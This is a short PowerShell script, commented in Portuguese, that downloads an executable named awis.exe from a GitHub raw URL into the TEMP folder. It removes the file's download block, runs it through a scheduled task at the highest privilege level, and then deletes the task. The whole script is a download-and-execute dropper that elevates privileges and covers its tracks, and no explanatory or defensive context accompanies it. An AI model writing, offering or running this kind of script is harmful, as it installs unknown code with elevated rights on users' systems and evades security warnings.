# Baixar e executar awis.exe com privilégios
$u = "https://github.com/user337666/brow666/raw/refs/heads/main/awis.exe"
$p = "$env:TEMP\awis.exe"
Invoke-WebRequest $u -OutFile $p
Unblock-File $p -ErrorAction SilentlyContinue
schtasks /Create /TN "RunTask" /TR "powershell -c Start-Process $p" /SC ONCE /ST 00:00 /RL HIGHEST /F
schtasks /Run /TN "RunTask"
Start-Sleep -Seconds 10
schtasks /Delete /TN "RunTask" /F
